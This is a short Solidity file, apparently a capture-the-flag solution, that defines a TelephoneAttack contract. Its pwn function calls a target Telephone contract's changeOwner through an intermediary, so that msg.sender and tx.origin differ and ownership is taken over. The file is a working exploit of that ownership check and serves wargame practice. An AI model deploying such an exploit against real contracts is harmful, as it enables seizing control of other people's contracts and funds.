pragma solidity ^0.4.18;

import "./Telephone.sol";

contract TelephoneAttack {
    address a;

    constructor(address _a) {
        a = _a;
    }
    function pwn(address _newOwner) {
        // We simply call the contract with a new owner. This will make
        // msg.sender and tx.origin to deviate.
       Telephone telephone = Telephone(a);
       telephone.changeOwner(_newOwner);
    }
}
